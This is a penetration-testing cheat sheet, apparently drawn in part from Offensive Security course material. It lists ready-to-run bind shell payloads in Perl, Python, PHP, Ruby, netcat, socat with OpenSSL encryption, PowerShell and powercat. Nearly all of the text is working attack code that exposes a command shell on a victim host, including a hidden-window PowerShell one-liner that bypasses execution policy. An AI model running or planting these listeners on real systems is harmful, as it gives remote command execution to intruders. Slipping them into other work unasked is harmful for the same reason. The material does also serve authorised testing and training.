# Bind Shell

### Perl

```perl
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));\
bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\
close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

### Python

Single line :

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Expanded version :

```python
import socket as s,subprocess as sp;

s1 = s.socket(s.AF_INET, s.SOCK_STREAM);
s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1);
s1.bind(("0.0.0.0", 51337));
s1.listen(1);
c, a = s1.accept();

while True: 
    d = c.recv(1024).decode();
    p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE);
    c.sendall(p.stdout.read()+p.stderr.read())
```

### PHP

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
    socket_write($cl,$m,strlen($m));}}'
```

### Ruby

```ruby
ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

### Netcat Traditional

```bash
nc -nlvp 51337 -e /bin/bash
```

### Netcat OpenBsd

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```

### Socat

```bash
#attacker
socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
#victim
socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

```bash
# Encrypted
--------------
# Generate self-signed certificate and private key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# Convert cert and key to format socat will accept
cat bind_shell.key bind_shell.crt > bind_shell.pem
# use openssl to create a listener
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
# connect to bind shell
socat - OPENSSL:10.11.0.4:443,verify=0
```

* req: initiate a new certificate signing request
* \-newkey: generate a new private key
* rsa:2048: use RSA encryption with a 2,048-bit key length.
* \-nodes: store the private key without passphrase protection
* \-keyout: save the key to a file
* \-x509: output a self-signed certificate instead of a certificate request
* \-days: set validity period in days
* \-out: save the certificate to a file

We use - to transfer data between _STDIO_[3](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/practical-tools/socat/socat-encrypted-bind-shells#fn3) and the remote host, OPENSSL to establish a remote SSL connection to the listener on 10.11.0.4:443, and verify=0 to disable SSL certificate verification

### Powershell

```powershell
https://github.com/besimorhino/powercat

# Victim (listen)
. .\powercat.ps1
powercat -l -p 7002 -ep

# Connect from attacker
. .\powercat.ps1
powercat -c 127.0.0.1 -p 7002

# One-liners
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

### Powercat

```bash
# set up bind shell
powercat -l -p 443 -e cmd.exe
# connect to bind shell
nc 10.11.0.22 443
```
